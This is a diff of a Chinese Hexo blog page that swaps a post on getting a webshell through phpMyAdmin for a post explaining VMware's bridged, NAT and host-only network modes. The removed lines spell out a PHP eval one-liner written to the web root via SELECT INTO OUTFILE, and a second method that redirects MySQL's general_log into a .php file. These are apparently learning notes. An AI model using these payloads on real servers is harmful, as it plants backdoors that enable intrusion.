@@ -4,9 +4,9 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="phpmyadmin,getshell的方法, Evergreen">
-    <meta name="description" content="phpmyadmin，getshell的方法getshell前提：phpmyadmin以root权限登陆。
-Phpmyadmin getshell一般情况下，有两种操作方式：1、sql语句into outfile写入getshell（前提：">
+    <meta name="keywords" content="虚拟机的三种网络模式, Evergreen">
+    <meta name="description" content="VMware有三种网络工作模式，它们分别是：Bridged（桥接模式）、NAT（网络地址转换模式）、Host-Only（仅主机模式）。
+一、Bridged（桥接模式）桥接模式就是将物理机网卡与虚拟机网卡利用虚拟网桥进行通信，在桥接的作用下，">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -14,7 +14,7 @@ Phpmyadmin getshell一般情况下，有两种操作方式：1、sql语句into o
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>phpmyadmin,getshell的方法 | Evergreen</title>
+    <title>虚拟机的三种网络模式 | Evergreen</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -305,12 +305,12 @@ Phpmyadmin getshell一般情况下，有两种操作方式：1、sql语句into o
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">phpmyadmin,getshell的方法</h1>
+                    <h1 class="description center-align post-title">虚拟机的三种网络模式</h1>
                 </div>
             </div>
         </div>
@@ -439,7 +439,7 @@ Phpmyadmin getshell一般情况下，有两种操作方式：1、sql语句into o
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-10-23
+                    2020-01-06
                 </div>
                 
 
@@ -456,27 +456,11 @@ Phpmyadmin getshell一般情况下，有两种操作方式：1、sql语句into o
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="phpmyadmin，getshell的方法"><a href="#phpmyadmin，getshell的方法" class="headerlink" title="phpmyadmin，getshell的方法"></a>phpmyadmin，getshell的方法</h2><p>getshell前提：phpmyadmin以root权限登陆。</p>
-<h3 id="Phpmyadmin-getshell一般情况下，有两种操作方式："><a href="#Phpmyadmin-getshell一般情况下，有两种操作方式：" class="headerlink" title="Phpmyadmin getshell一般情况下，有两种操作方式："></a>Phpmyadmin getshell一般情况下，有两种操作方式：</h3><h4 id="1、sql语句into-outfile写入getshell（前提：需要知道网站根目录）"><a href="#1、sql语句into-outfile写入getshell（前提：需要知道网站根目录）" class="headerlink" title="1、sql语句into outfile写入getshell（前提：需要知道网站根目录）"></a>1、sql语句into outfile写入getshell（前提：需要知道网站根目录）</h4><p>​      执行 Select “<!--?php @eval($_POST['pass'])?-->“ into outfile         “C:/phpStudy/PHPTutorial/WWW/a.php”; </p>
-<p>会出现 // #1290 -The MYSQL server is running with the –secure-file-priv  option so it cannot execute this statement 错误，原因是mysql正在使用–secure-file-priv选项运行，所以它无法执行这条sql语句。</p>
-<p>  Show global variables like “%secure_file_priv%”    //查看secure_file_priv文件的配置情况 </p>
-<p> Secure_file_priv为NULL时，mysql不允许导入导出</p>
-<p>Secure_file_priv为/tmp时，mysql只能在/tmp目录中执行导入导出</p>
-<p>Secure_file_priv没有值时，不限制mysql的导入导出。</p>
-<p> 想要into outfile写入数据就需要在mysql文件夹下修改my.ini文件，在my.ini文件中加入secure_file_priv=””，就可以实现into outfile写入数据了。</p>
-<h5 id="sql语句into-outfile和into-dumpfile的区别："><a href="#sql语句into-outfile和into-dumpfile的区别：" class="headerlink" title="sql语句into outfile和into dumpfile的区别："></a>sql语句into outfile和into dumpfile的区别：</h5><p>into outfile函数会在行末端写入新行，还会转义换行符，就会破坏二进制文件。</p>
-<p> into dumpfile可以完整的导出一个二进制文件。因为into dumpfile函数不对任何列或者行进行终止，也不执行任何转义处理。</p>
-<h4 id="2、Mysql日志写webshell"><a href="#2、Mysql日志写webshell" class="headerlink" title="2、Mysql日志写webshell"></a>2、Mysql日志写webshell</h4><p>mysql每执行一个语句，就会把sql语句写入到日志文件中，但是默认情况下，这个选项时关闭的。</p>
-<p>因此，需要去开启这个选项，再设置日志路径，日志路径设置为网站根目录，日志文件名字改为.php结尾的文件。</p>
-<p>Show  global  variables like “%genera%”;      //查询general文件的配置情况.</p>
-<p>Set   global general_log=’on’;            //开启general log日志。</p>
-<p>Set  global general_log_file=’C:/phpStudy/PHPTutorial/WWW/500.php’;       //设置日志文件保存路径。</p>
-<p>执行任意的sql语句，就能把内容存储到.php文件中。</p>
-<p>​    select  “<!--?php @eval ($_POST[' pass'] ?-->“;      //一句话写入日志文件。</p>
-<p>​    set global general_log=’off’;       //关闭general_log日志 </p>
-<p>​    </p>
-<h5 id="phpmyadmin，getshell的核心："><a href="#phpmyadmin，getshell的核心：" class="headerlink" title="phpmyadmin，getshell的核心："></a>phpmyadmin，getshell的核心：</h5><p>​                         1、找到网站的绝对路径</p>
-<p>​                         2、执行sql语句。</p>
+                <h4 id="VMware有三种网络工作模式，它们分别是："><a href="#VMware有三种网络工作模式，它们分别是：" class="headerlink" title="VMware有三种网络工作模式，它们分别是："></a>VMware有三种网络工作模式，它们分别是：</h4><p>Bridged（桥接模式）、NAT（网络地址转换模式）、Host-Only（仅主机模式）。</p>
+<h6 id="一、Bridged（桥接模式）"><a href="#一、Bridged（桥接模式）" class="headerlink" title="一、Bridged（桥接模式）"></a>一、Bridged（桥接模式）</h6><p>桥接模式就是将物理机网卡与虚拟机网卡利用虚拟网桥进行通信，在桥接的作用下，类似于把物理主机虚拟做交换机，所有桥接设置的虚拟机连接到这个交换机的一个接口上，</p>
+<p>物理主机也同样插在这个交换机当中，所以所有桥接下的网卡与网卡都是交换模式的，相互可以访问而不干扰。在桥接模式下，虚拟机ip地址需要与主机在同一个网段，如果需要联网，则网关与DNS需要与主机网卡一致。</p>
+<h6 id="二、NAT（网络地址转换）"><a href="#二、NAT（网络地址转换）" class="headerlink" title="二、NAT（网络地址转换）"></a>二、NAT（网络地址转换）</h6><p>NAT模式借助虚拟NAT设备和虚拟DHCP服务器，使得虚拟机可以联网。</p>
+<h6 id="三、Host-Only-（仅主机模式）"><a href="#三、Host-Only-（仅主机模式）" class="headerlink" title="三、Host-Only （仅主机模式）"></a>三、Host-Only （仅主机模式）</h6><p>Host-Only模式其实就是NAT模式去除了虚拟NAT设备，然后使用VMware Network Adapter VMnet1虚拟网卡连接VMnet1虚拟交换机来与虚拟机通信的，Host-Only模式将虚拟机与外网隔开，使得虚拟机成为一个独立的系统，只与主机相互通讯。</p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -520,7 +504,7 @@ Phpmyadmin getshell一般情况下，有两种操作方式：1、sql语句into o
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://feather-arch.github.io/2019/10/23/phpmyadmin-getshell的方法/">https://feather-arch.github.io/2019/10/23/phpmyadmin-getshell的方法/</a>
+                    <a href="https://feather-arch.github.io/2020/01/06/虚拟机的三种网络模式/">https://feather-arch.github.io/2020/01/06/虚拟机的三种网络模式/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -721,9 +705,10 @@ Phpmyadmin getshell一般情况下，有两种操作方式：1、sql语句into o
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2020/01/06/虚拟机的三种网络模式/">
                     <div class="card-image">
@@ -742,9 +727,9 @@ Phpmyadmin getshell一般情况下，有两种操作方式：1、sql语句into o
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-01-06
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-01-06
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -753,6 +738,7 @@ Phpmyadmin getshell一般情况下，有两种操作方式：1、sql语句into o
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -763,29 +749,25 @@ Phpmyadmin getshell一般情况下，有两种操作方式：1、sql语句into o
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/09/23/upload-loads1-13关/">
+                <a href="/2019/10/23/phpmyadmin-getshell的方法/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="upload-loads1-13关">
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="phpmyadmin,getshell的方法">
                         
-                        <span class="card-title">upload-loads1-13关</span>
+                        <span class="card-title">phpmyadmin,getshell的方法</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            title: upload-labs3-13关date: 2019-09-14 08:55:44tags:
-upload-labs3-13关第三关：
-由此可知本关禁止上传.asp|.aspx|.php|.jsp后缀文件！
-
-
-判断是黑名单检
+                            phpmyadmin，getshell的方法getshell前提：phpmyadmin以root权限登陆。
+Phpmyadmin getshell一般情况下，有两种操作方式：1、sql语句into outfile写入getshell（前提：
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2019-09-23
+                                <i class="far fa-clock fa-fw icon-date"></i>2019-10-23
                             </span>
                         <span class="publish-author">
                             
